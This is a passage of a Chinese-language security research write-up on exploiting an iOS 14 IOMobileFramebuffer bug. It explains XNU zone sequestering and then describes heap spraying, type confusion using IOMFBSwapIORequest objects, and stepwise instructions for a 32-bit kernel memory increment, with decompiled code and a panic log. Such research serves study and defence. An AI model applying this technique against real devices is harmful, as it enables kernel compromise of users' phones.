zone_reclaim_chunk(z, meta, count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/zalloc.c#L6173">zone_reclaim_chunk</a>弹出从z-&gt;z_pageq_empty传递给它的zone page metadata:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">zone_reclaim_chunk</span><span class="params">(<span class="type">zone_t</span> z, <span class="keyword">struct</span> zone_page_metadata *meta, <span class="type">uint32_t</span> free_count)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Declaring variables */</span></span><br><span class="line"></span><br><span class="line">    zone_meta_queue_pop_native(z, &amp;z-&gt;z_pageq_empty, &amp;page_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... */</span></span><br></pre></td></tr></table></figure>

<p>在<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/zalloc.c#L6258">zone_reclaim_chunk</a>的结尾:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (sequester) &#123;</span><br><span class="line">    kernel_memory_depopulate(zone_submap(z), page_addr,</span><br><span class="line">        size_to_free, KMA_KOBJECT, VM_KERN_MEMORY_ZONE);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    kmem_free(zone_submap(z), page_addr, ptoa(z-&gt;z_chunk_pages));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样，对于KHEAP_DEFAULT和KHEAP_KEXT来说，sequester将永远是真的。kmem_free释放的是块和支持该块的物理内存，而kernel_memory_depopulate只释放物理内存。在往下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (sequester) &#123;</span><br><span class="line">    zone_meta_queue_push(z, &amp;z-&gt;z_pageq_va, meta);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>刚刚填充的区块的页面元数据被推送到一个叫做z_pageq_va的队列中。这个队列在iOS 14中首次出现，它位于zone结构中z_pageq_full之后。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> &#123;</span></span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">zone_pva_t</span>          z_pageq_empty;  <span class="comment">/* populated, completely empty pages   */</span></span><br><span class="line">    <span class="type">zone_pva_t</span>          z_pageq_partial;<span class="comment">/* populated, partially filled pages   */</span></span><br><span class="line">    <span class="type">zone_pva_t</span>          z_pageq_full;   <span class="comment">/* populated, completely full pages    */</span></span><br><span class="line">    <span class="type">zone_pva_t</span>          z_pageq_va;     <span class="comment">/* non-populated VA pages              */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>z_pageq_va将会被 <a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/zalloc.c#L4535"><code>zone_expand_locked()</code></a>函数使用.如果一个zone的空闲元素开始耗尽，这个函数就会被调用来重新填充该zone。它所做的第一件事就是看是否可以重新使用z_pageq_va中的一个被删除的块。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!zone_pva_is_null(z-&gt;z_pageq_va)) &#123;</span><br><span class="line">    meta = zone_meta_queue_pop_native(z,</span><br><span class="line">        &amp;z-&gt;z_pageq_va, &amp;addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (meta-&gt;zm_chunk_len == ZM_SECONDARY_PAGE) &#123;</span><br><span class="line">        cur_pages = meta-&gt;zm_page_index;</span><br><span class="line">        meta -= cur_pages;</span><br><span class="line">        addr -= ptoa(cur_pages);</span><br><span class="line">        zone_meta_lock_in_partial(z, meta, cur_pages);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们把注意力转移到<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/zalloc.c#L4635">zone_expand_locked</a>上，我们会看到XNU试图用vm_page_grab抓取足够的空闲页来满足min_pages，而不是满足zone z的chunk大小。min_pages是z的元素大小，四舍五入到最近的页。这就是后来可能产生部分填充的块的原因，因为这里没有任何东西强制要求为addr所属的块中的每个页面分配一个空闲页。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (pages &lt; z-&gt;z_chunk_pages - cur_pages) &#123;</span><br><span class="line">    <span class="type">vm_page_t</span> m = vm_page_grab();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (m) &#123;</span><br><span class="line">        pages++;</span><br><span class="line">        m-&gt;vmp_snext = page_list;</span><br><span class="line">        page_list = m;</span><br><span class="line">        vm_page_zero_fill(m);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pages &gt;= min_pages &amp;&amp; (vm_pool_low() || waited)) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来，调用kernel_memory_populate_with_pages来重新映射最近被释放的z_pageq_va块的虚拟内存到支持刚刚被分配的自由页的物理内存上。然而，如果XNU不能分配足够的空闲页来满足该块的长度，那么在kernel_memory_populate_with_pages返回后，该块中的一些页将继续被释放，产生一个部分填充的块。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kernel_memory_populate_with_pages(zone_submap(z),</span><br><span class="line">    addr + ptoa(cur_pages), ptoa(pages), page_list,</span><br><span class="line">    zone_kma_flags(z, flags), VM_KERN_MEMORY_ZONE);</span><br></pre></td></tr></table></figure>

<p>最后，<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/zalloc.c#L4373">zcram_and_lock</a>被调用。这个函数负责使被重新映射的块再次可用于一个区域。如果这个区块最终被部分填充，它将确保被填充的页面能够回到z_pageq_va中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pg_end &lt; chunk_pages) &#123;</span><br><span class="line">    <span class="comment">/* push any non populated residual VA on z_pageq_va */</span></span><br><span class="line">    zone_meta_queue_push(zone, &amp;zone-&gt;z_pageq_va, meta + pg_end);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ... */</span></span><br></pre></td></tr></table></figure>

<p>总结一下，新的zone垃圾收集zone扩展流程提供了一个真正强有力的保证：因为被封存的页面的虚拟内存实际上并没有释放到zone映射上，所以不可能将这些虚拟内存重新用于其他分区。支持KHEAP_DATA_BUFFERS的区域没有被封存，不同于KHEAP_DEFAULT和KHEAP_KEXT，KHEAP_DATA_BUFFERS单独存在于一个地方。</p>
<h2 id="Pipe管道"><a href="#Pipe管道" class="headerlink" title="Pipe管道"></a>Pipe管道</h2><p>我们可以越界读取一个在kext.kalloc.6144内的、巨大的、0x13a0字节的UnifiedPipeline对象中的内联数组<code>IOSurface*[]</code>，kext.kalloc.6144的内存区域比较稳定，所以对这个区域进行喷射，分配的内存会落在这个UnifiedPipeline对象的周围。由于数组的访问是通过<code>*(UnifiedPipeline + 0xa98 + (0x8 * idx))</code>的形式进行的，因此可以从UnifiedPipeline对象中读出任何指针字段，并对其进行类型混淆。下面是去除内核指针后的字段:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;offset&gt;:&lt;对象类&gt; (&lt;大小&gt;)</span><br><span class="line"><span class="number">0x18</span>: 	<span class="built_in">OSDictionary</span> (<span class="number">0x40</span>)</span><br><span class="line"><span class="number">0x20</span>: 	<span class="built_in">OSDictionary</span> (<span class="number">0x40</span>)</span><br><span class="line"><span class="number">0x30</span>: 	<span class="built_in">AppleARMIODevice</span> (<span class="number">0xd8</span>)</span><br><span class="line"><span class="number">0x60</span>: 	<span class="built_in">IOServicePM</span> (<span class="number">0x288</span>)</span><br><span class="line"><span class="number">0x7f8</span>: 	<span class="built_in">IOSurface</span>  (<span class="number">0x400</span>)</span><br><span class="line"><span class="number">0x810</span>: 	<span class="built_in">IODMACommand</span> (<span class="number">0x78</span>)</span><br><span class="line"><span class="number">0xb28</span>: 	<span class="built_in">IOMFBSwapIORequest</span> (<span class="number">0x640</span>)</span><br><span class="line"><span class="number">0xba8</span>: 	<span class="built_in">IODARTMapper</span> (<span class="number">0x690</span>)</span><br><span class="line"><span class="number">0xbb0</span>: 	<span class="built_in">IOSurfaceRoot</span> (<span class="number">0x1f0</span>)</span><br><span class="line"><span class="number">0xbb8</span>: 	<span class="built_in">IOCommandGate</span> (<span class="number">0x50</span>)</span><br><span class="line"><span class="number">0xbc0</span>: 	<span class="built_in">IOWorkLoop</span> (<span class="number">0x48</span>)</span><br><span class="line"><span class="number">0xbc8</span>: 	<span class="built_in">IOSurface</span> (<span class="number">0x400</span>)</span><br><span class="line"><span class="number">0xbd0</span>: 	<span class="built_in">IOPMServiceInterestNotifier</span> (<span class="number">0x88</span>)</span><br><span class="line"><span class="number">0xbd8</span>: 	<span class="built_in">IOInterruptEventSource</span> (<span class="number">0x68</span>)</span><br><span class="line"><span class="number">0xbe0</span>: 	<span class="built_in">AppleARMIODevice</span> (<span class="number">0xd8</span>)</span><br><span class="line"><span class="number">0xbe8</span>: 	<span class="built_in">IOTimerEventSource</span> (<span class="number">0x60</span>)</span><br><span class="line"><span class="number">0xd30</span>: 	<span class="built_in">IOSurfaceDeviceMemoryRegion</span> (<span class="number">0x60</span>)</span><br><span class="line"><span class="number">0xd40</span>: 	<span class="built_in">IOCommandPool</span> (<span class="number">0x38</span>)</span><br><span class="line"><span class="number">0xd68</span>: 	<span class="built_in">AppleMobileFileIntegrity</span> (<span class="number">0x88</span>)</span><br><span class="line"><span class="number">0x1230</span>: <span class="built_in">VideoInterfaceMipi</span> (<span class="number">0x78</span>)</span><br><span class="line"><span class="number">0x12d8</span>: <span class="built_in">AppleARMBacklight</span> (<span class="number">0x358</span>)</span><br></pre></td></tr></table></figure>

<p>这里要选取大小比IOSurface大的对象，就是IOSurface、IOMFBSwapIORequest和IODARTMapper。POC触发内核Panic的函数是IOSurfaceSendRight::init，IOSurface是其第三个参数，如果使用IOSurface来进行堆喷，则不能造成类型混淆。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IOSurfaceSendRight::<span class="built_in">init</span>(IOSurfaceSendRight *__hidden <span class="keyword">this</span>, IOSurfaceRoot *, IOSurface *)</span><br></pre></td></tr></table></figure>

<p>IODARTMapper不是一个可以从应用程序沙盒中创建的对象，因此，只能选择IOMFBSwapIORequest。</p>
<p>通过对IOMobileFramebufferUserClient进行逆向分析，可以看到有很多包含swap的外部方法:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">External method <span class="number">4</span>: IOMobileFramebufferUserClient::s_swap_start</span><br><span class="line">External method <span class="number">5</span>: IOMobileFramebufferUserClient::s_swap_submit</span><br><span class="line">External method <span class="number">6</span>: IOMobileFramebufferUserClient::s_swap_wait</span><br><span class="line">External method <span class="number">20</span>: IOMobileFramebufferUserClient::s_swap_signal</span><br><span class="line">External method <span class="number">52</span>: IOMobileFramebufferUserClient::s_swap_cancel</span><br><span class="line">External method <span class="number">69</span>: IOMobileFramebufferUserClient::s_swap_set_color_matrix</span><br><span class="line">External method <span class="number">81</span>: IOMobileFramebufferUserClient::s_swap_cancel_all</span><br></pre></td></tr></table></figure>

<p>可以在应用程序沙盒内访问IOMobileFramebufferUserClient，继续分析</p>
<p>外部方法4：调用IOMobileFramebufferUserClient::s_swap_start时，将会进入IOMobileFramebufferLegacy::swap_start。该函数调用 IOMFBSwapIORequest::create 来分配一个新的IOMFBSwapIORequest对象。在一点初始化之后，新创建的swap的 swap ID被计算出来，并作为这个外部方法的唯一输出传回给我们。因此，可以实现从用户空间创建IOMFBSwapIORequests。</p>
<p>但是，我们无法控制IOMobileFramebufferUserClient::s_swap_start对新创建的IOMFBSwapIORequest的初始化操作。</p>
<p>外部方法5：IOMobileFramebufferUserClient::s_swap_submit的输入参数对任何超过0x280字节的大小，都会报错（至少对于14.6和14.7）。</p>
<p>要 “提交 “的IOMFBSwapIORequest的swap ID是通过结构输入而传递的。在调用 IOMobileFramebufferUserClient::s_swap_submit 之后，我们最终会在 UnifiedPipeline::swap_submit 中结束。这是一个大函数，它将我们的大部分结构输入复制到与我们指定的swap ID相对应的IOMFBSwapIORequest对象。结构输入中没有被直接复制到对象中的部分是像IOSurface ID这样的东西。这些ID被用来推导IOSurface指针，这些指针被写入对象中。这个函数的一个有趣之处在于它从结构输入中读取一个用户空间指针，从该指针和当前任务中创建一个IOBufferMemoryDescriptor对象，然后从该内存中复制0x20c字节到IOMFBSwapIORequest对象，从偏移量0x366开始。所以我们真的有0x280+0x20c字节的控制输入。但由于IOMFBSwapIORequest::create将其分配的IOMFBSwapIORequest清零，这些字节仍然为零，这对漏洞利用开发来说并没有什么区别。</p>
<p>类型混淆的第三个要求：在偏移量0xc0处会有一个非空指针，在偏移量0x3f0处会有一个非空（或NULL）指针。首先，让我们检查一下我们是否对这些字节有控制权，因为这意味着我们将能够自己创造这些条件。恼人的是，这个函数是以这样的方式编译的，很难快速地用眼看到我们是否对偏移量0xc0有控制。尽管如此，我们确实控制了这八个字节。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; *(_DWORD *)(found_swap + <span class="number">356</span> + <span class="number">4LL</span> * j); ++k )</span><br><span class="line">&#123;</span><br><span class="line">  v26 = (<span class="type">int</span> *)(input_swap + <span class="number">268</span> + ((__int64)j &lt;&lt; <span class="number">6</span>));</span><br><span class="line">  v27 = v26[<span class="number">4</span> * k + <span class="number">1</span>];</span><br><span class="line">  v28 = v26[<span class="number">4</span> * k + <span class="number">2</span>];</span><br><span class="line">  v29 = v26[<span class="number">4</span> * k + <span class="number">3</span>];</span><br><span class="line">  v30 = (_DWORD *)(found_swap + <span class="number">113</span> + ((__int64)j &lt;&lt; <span class="number">6</span>) + <span class="number">0x10LL</span> * (<span class="type">int</span>)k);</span><br><span class="line">  *v30 = v26[<span class="number">4</span> * k];</span><br><span class="line">  v30[<span class="number">1</span>] = v27;</span><br><span class="line">  v30[<span class="number">2</span>] = v28;</span><br><span class="line">  v30[<span class="number">3</span>] = v29;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>found_swap是我们要提交的IOMFBSwapIORequest，input_swap是我们的结构输入。*(_DWORD *)(found_swap + 356 + 4LL * j)是可控的，但被验证为落在[0, 4]范围内。相反，很容易看到我们也控制了偏移量为0x3f0的8个字节，因为那是0x20c字节区域的一部分，它是由我们在结构输入上提供的用户空间指针复制过来的。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (*(found_swap + <span class="number">868</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> &amp;&amp; *(input_swap + <span class="number">56</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  *(found_swap + <span class="number">869</span>) = <span class="number">1</span>;</span><br><span class="line">  v55 = <span class="number">0LL</span>;</span><br><span class="line">  address = *(input_swap + <span class="number">56</span>);</span><br><span class="line">  task = <span class="built_in">current_task</span>();</span><br><span class="line">  v55 = IOMemoryDescriptor::<span class="built_in">withAddressRange</span>(address, <span class="number">0x20CuLL</span>, <span class="number">3u</span>, task);</span><br><span class="line">  <span class="keyword">if</span> ( v55 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (v55-&gt;prepare)(v55, <span class="number">0LL</span>) )</span><br><span class="line">      <span class="built_in">panic</span>(<span class="string">&quot;\&quot;%s System error: Failure to prepare memory descriptor\\n\&quot;&quot;</span>, <span class="string">&quot;swap_submit&quot;</span>);</span><br><span class="line">    v54 = <span class="number">-1431655766</span>;</span><br><span class="line">    v54 = (v55-&gt;readBytes)(v55, <span class="number">0LL</span>, found_swap + <span class="number">0x366</span>, <span class="number">0x20CLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v54 != <span class="number">0x20CLL</span> )</span><br><span class="line">      <span class="built_in">panic</span>(<span class="string">&quot;\&quot;%s System error: Mismatched data size\\n\&quot;&quot;</span>, <span class="string">&quot;swap_submit&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    (v55-&gt;complete)(v55, <span class="number">0LL</span>);</span><br><span class="line">    (v55-&gt;release_0)(v55);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以控制偏移量为0xc0和0x3f0的指针。如果我们用这个对象输入混淆，那么我们就可以在内核内存的任何地方做32位增量。唯一要弄清楚的是，我们是否能得到一个指向我们提交给UnifiedPipeline对象的IOMFBSwapIORequest对象的指针。这个问题的答案就在UnifiedPipeline::swap_submit的底部。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v63 = IOMobileFramebufferLegacy::<span class="built_in">swap_queue</span>(UnifiedPipeline, found_swap);</span><br></pre></td></tr></table></figure>

<p>经过对该函数的逆向分析，发现在UnifiedPipeline对象中，有一个IOMFBSwapIORequest对象的尾队列，从偏移量0xb18开始。最终，IOMobileFramebufferLegacy::queue_move_entry_gated被调用。在它的中间附近，有一个明显的<a target="_blank" rel="noopener" href="https://linux.die.net/man/3/queue">TAILQ_INSERT_TAIL</a>。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*(found_swap + <span class="number">0x630</span>) = <span class="number">0LL</span>;</span><br><span class="line">*(found_swap + <span class="number">0x638</span>) = UnifiedPipeline_swap_tailq_B18-&gt;tqe_last;</span><br><span class="line">*UnifiedPipeline_swap_tailq_B18-&gt;tqe_last = found_swap;</span><br><span class="line">UnifiedPipeline_swap_tailq_B18-&gt;tqe_last = (found_swap + <span class="number">0x630</span>);</span><br></pre></td></tr></table></figure>

<p>由于<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/bsd/sys/queue.h#L600">TAILQ_HEAD</a>宏将tqe_last初始化为指向tqe_first的地址，第三行将found_swap写到UnifiedPipeline对象的偏移量0xb18。因此，每次我们成功调用IOMobileFramebufferUserClient::s_swap_submit时，我们可以指望一个指向结构输入中指定的交换的指针出现在UnifiedPipeline对象的偏移量0xb18处。</p>
<p>有了到目前为止我们所知道的一切，我们应该能够通过以下步骤来增加32位的内核内存:</p>
<ol>
<li>用IOMobileFramebufferUserClient::s_swap_start创建一个新的IOMFBSwapIORequest。</li>
<li>使用IOMobileFramebufferUserClient::s_swap_submit来获取在步骤1中创建的IOMFBSwapIORequest对象的偏移量0xc0和0x3f0的受控字节。0xc0将是我们提供的内核指针，0x3f0将是NULL。该交换对象的指针将被写入UnifiedPipeline对象的偏移量0xb18。</li>
<li>调用 IOMobileFramebufferUserClient::s_displayed_fb_surface 的越界下标16，因为0xb18 - 0xa98是0x80，而 0x80&#x2F;sizeof(IOMFBSwapIORequest *) 是16。我们将进入IOSurfaceSendRight::init，oob_surface指向IOMFBSwapIORequest对象，IOSurface::increment_use_count将愉快地增加该交换的八个受控字节在偏移量0xc0所指向的32位。<ol>
<li>0xa98是IOSurface数组的偏移量，我们可以从它那里越界读。</li>
</ol>
</li>
</ol>
<p>通过在swap的偏移量0xc0处放置一个类似0x41414142424的指针来测试这个方法。如果内核在OSIncrementAtomic中解除对它的引用，那么我们就成功了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;bug_type&quot;</span>:<span class="string">&quot;210&quot;</span>,<span class="string">&quot;timestamp&quot;</span>:<span class="string">&quot;2021-11-03 13:06:45.00 -0400&quot;</span>,<span class="string">&quot;os_version&quot;</span>:<span class="string">&quot;iPhone OS 14.6 (18F72)&quot;</span>,<span class="string">&quot;incident_id&quot;</span>:<span class="string">&quot;D6CE2A99-9C2A-49E4-8150-D648AC1F3BE6&quot;</span>&#125;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;build&quot;</span> : <span class="string">&quot;iPhone OS 14.6 (18F72)&quot;</span>,</span><br><span class="line">  <span class="string">&quot;product&quot;</span> : <span class="string">&quot;iPhone10,4&quot;</span>,</span><br><span class="line">  <span class="string">&quot;kernel&quot;</span> : <span class="string">&quot;Darwin Kernel Version 20.5.0: Sat May  8 02:21:43 PDT 2021; root:xnu-7195.122.1~4\/RELEASE_ARM64_T8015&quot;</span>,</span><br><span class="line">  <span class="string">&quot;incident&quot;</span> : <span class="string">&quot;D6CE2A99-9C2A-49E4-8150-D648AC1F3BE6&quot;</span>,</span><br><span class="line">  <span class="string">&quot;crashReporterKey&quot;</span> : <span class="string">&quot;1db1b5662483938458430f8a3af5439dc5f1064d&quot;</span>,</span><br><span class="line">  <span class="string">&quot;date&quot;</span> : <span class="string">&quot;2021-11-03 13:06:45.03 -0400&quot;</span>,</span><br><span class="line">  <span class="string">&quot;panicString&quot;</span> : <span class="string">&quot;panic(cpu 2 caller 0xfffffff028aff2d4): Unaligned kernel data abort. at pc 0xfffffff0289b230c, lr 0xfffffff028e5409c (saved state: 0xffffffe8045eb380)</span></span><br><span class="line"><span class="string">    x0: 0x4141414142424256  x1:  0x0000000000000000  x2:  0xfffffff0289b4fac  x3:  0x0000000000000000</span></span><br><span class="line"><span class="string">    x4: 0x0000000000000000  x5:  0x0000000000000000  x6:  0x0000000000000000  x7:  0x0000000000000330</span></span><br><span class="line"><span class="string">    x8: 0x0000000000000001  x9:  0x0000000000000001  x10: 0x0000000000000002  x11: 0xffffffe4cc2ca458</span></span><br><span class="line"><span class="string">    x12: 0x0000000000000001 x13: 0x0000000000000002  x14: 0xffffffe19cc1a920  x15: 0x0000000000000003</span></span><br><span class="line"><span class="string">    x16: 0x0000000000000000 x17: 0x000000000000000f  x18: 0xfffffff028aed000  x19: 0xffffffe4cc2ca450</span></span><br><span class="line"><span class="string">    x20: 0x0000000000000001 x21: 0x0000000000000000  x22: 0xffffffe4cc1a0860  x23: 0x00000000e00002c2</span></span><br><span class="line"><span class="string">    x24: 0x0000000000000000 x25: 0xffffffe8045ebaec  x26: 0xffffffe4cd7601f0  x27: 0xffffffe4cd80ebf4</span></span><br><span class="line"><span class="string">    x28: 0x0000000000000000 fp:  0xffffffe8045eb6e0  lr:  0xfffffff028e5409c  sp:  0xffffffe8045eb6d0</span></span><br><span class="line"><span class="string">    pc:  0xfffffff0289b230c cpsr: 0x60400204         esr: 0x96000021          far: 0x4141414142424256</span></span><br></pre></td></tr></table></figure>

<p>为什么x0不是0x41414142424242，是因为IOSurface::increment_use_count在它传递给OSIncrementAtomic的指针上增加了0x14。</p>
<h2 id="oob-surface-surface-id存在的问题"><a href="#oob-surface-surface-id存在的问题" class="headerlink" title="oob_surface-&gt;surface_id存在的问题"></a>oob_surface-&gt;surface_id存在的问题</h2><p>每次用IOMobileFramebufferUserClient::s_displayed_fb_surface做增量时，都会通过其标量输出返回一个Mach端口名称。在内核中，这个端口是由一个IOSurfaceSendRight对象支持的。IOSurfaceSendRight是一个小对象，通常携带一个指向IOSurface的指针。但对我们来说，这将是一个指向 IOMFBSwapIORequest 对象的指针，为了简单起见，从现在起将这些端口称为 “swap端口”。</p>
<p>当我们在这里处理端口时，99%的IOSurface kext都在处理ID。更大的情形是这样的：每个IOSurfaceRootUserClient客户端都维护它自己的IOSurfaceClient对象数组。IOSurface ID实际上只是该数组的一个索引。如果某个索引的IOSurfaceClient指针是NULL，那么这个索引就被认为是一个自由的IOSurface ID。IOSurfaceClient对象是携带一个指向IOSurface的指针。这可以用一行代码来总结。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IOSurface *surface = IOSurfaceRootUserClient-&gt;surface_client_array[surface_id]-&gt;surface;</span><br></pre></td></tr></table></figure>

<p><img src="https://jsherman212.github.io/assets/popping_ios14_with_iomfb/iosurface_bigger_picture.png"></p>
<p>绿色方框代表结构字段。IOSurfaceRootUserClient的IOSurfaceClient指针数组在偏移量0x118，IOSurfaceClient对象的IOSurface指针在偏移量0x40。</p>
<p>对于这个kext的99%来说，如果某个IOSurface ID没有IOSurfaceClient对象，那么这个ID对应的IOSurface对象就可能不存在。而这正是我们的问题–我们只有一个端口。幸运的是，IOSurfaceRootUserClient的外部方法34，IOSurfaceRootUserClient::s_lookup_surface_from_port，旨在解决这个问题。它接收一个由IOSurfaceSendRight对象支持的Mach端口，并吐出一个IOSurface ID，以及许多其他的字节，我不知道其目的是什么。</p>
<p>我的第一个想法是使用IOSurfaceRootUserClient::s_lookup_surface_from_port来获得一个swap端口的ID。然后我就用这个ID和其他IOSurfaceRootUserClient的外部方法结合起来，尝试泄露IOSurface的指针，这些指针被写到IOMobileFramebufferUserClient::s_swap_submit里面的交换对象。</p>
<p>当调用IOSurfaceRootUserClient::s_lookup_surface_from_port与一个swap端口时，它将意识到没有IOSurfaceClient对象存在，而这个对象是连接到支持的IOSurfaceSendRight对象的IOMFBSwapIORequest。因此，一个新的IOSurfaceClient对象将被分配，IOSurfaceClient::init将被调用。</p>
